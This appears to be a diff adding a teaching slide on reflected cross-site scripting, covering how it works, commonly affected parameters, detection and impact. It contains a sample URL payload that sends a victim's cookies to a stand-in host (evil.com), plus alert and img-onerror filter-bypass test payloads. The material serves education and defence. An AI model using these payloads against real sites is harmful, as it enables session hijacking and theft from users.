@@ -1,0 +1,108 @@
+<h1>Reflected Cross-Site Scripting</h1>
+
+<div class="definition-box">
+  <h2>What is Reflected XSS?</h2>
+  <p>
+    Reflected XSS is the simplest type of cross-site scripting vulnerability.
+    The malicious script comes from the current HTTP request and is "reflected"
+    back to the user in the server's immediate response. It's non-persistent and
+    requires the victim to click on a specially crafted link or submit a form.
+  </p>
+</div>
+
+<h2>How Reflected XSS Works</h2>
+<p>The attack typically follows this pattern:</p>
+<ol>
+  <li>Attacker crafts a malicious URL containing a script payload</li>
+  <li>
+    Attacker tricks the victim into clicking the URL (via email, message, etc.)
+  </li>
+  <li>The victim's browser sends the request to the vulnerable website</li>
+  <li>The website includes the malicious script in its response</li>
+  <li>
+    The script executes in the victim's browser with the website's privileges
+  </li>
+</ol>
+
+<div class="example-box">
+  <h3>Reflected XSS Example:</h3>
+  <p>
+    Consider a search page that displays your query:
+    <code>search.php?q=your+search+term</code>
+  </p>
+  <p>Malicious URL might look like:</p>
+  <p>
+    <code
+      >search.php?q=&lt;script&gt;document.location='https://evil.com/steal.php?cookie='+document.cookie&lt;/script&gt;</code
+    >
+  </p>
+  <p>
+    When the victim clicks this link, the script is sent to the server and
+    reflected back in the response, stealing the victim's cookies and sending
+    them to the attacker's server.
+  </p>
+</div>
+
+<h2>Common Vulnerable Parameters</h2>
+<p>Reflected XSS frequently occurs in:</p>
+<ul>
+  <li>Search fields and results pages</li>
+  <li>Error messages that display submitted data</li>
+  <li>HTTP headers reflected in the page (e.g., User-Agent, Referer)</li>
+  <li>Form inputs reflected back to users</li>
+  <li>URL parameters directly rendered in the page content</li>
+</ul>
+
+<div class="danger-box">
+  <h3>Attack Vector</h3>
+  <p>
+    Reflected XSS attacks often require social engineering to convince victims
+    to click on malicious links. These links might be distributed through
+    phishing emails, social media messages, or compromised websites. The attack
+    is typically a one-time event that requires user interaction each time.
+  </p>
+</div>
+
+<h2>Detection Techniques</h2>
+<p>To identify reflected XSS vulnerabilities:</p>
+<ul>
+  <li>
+    Test all input parameters with simple payloads like
+    <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>
+  </li>
+  <li>Check if the server reflects input without proper encoding</li>
+  <li>Use automated scanners to test parameters systematically</li>
+  <li>Analyze HTTP responses for reflected content</li>
+  <li>Test alternative payload formats that might bypass filters</li>
+</ul>
+
+<div class="example-box">
+  <h3>Testing for Reflected XSS:</h3>
+  <p>
+    1. Submit test strings with special characters: <code>&lt;&gt;"';</code>
+  </p>
+  <p>2. Check if they appear unencoded in the response</p>
+  <p>
+    3. Try a harmless JavaScript payload:
+    <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+  </p>
+  <p>
+    4. If filters are present, try bypass techniques:
+    <code>&lt;img src="x" onerror="alert(1)"&gt;</code>
+  </p>
+</div>
+
+<h2>Impact of Reflected XSS</h2>
+<p>Though requiring user interaction, reflected XSS can still:</p>
+<ul>
+  <li>Steal sensitive user information and session cookies</li>
+  <li>Perform unauthorized actions on behalf of the victim</li>
+  <li>Capture keystrokes and form inputs</li>
+  <li>Redirect users to phishing sites</li>
+  <li>Modify the appearance and behavior of the website</li>
+</ul>
+
+<p>
+  In the next slide, we'll explore Stored XSS, which is more persistent and
+  dangerous than reflected attacks.
+</p>
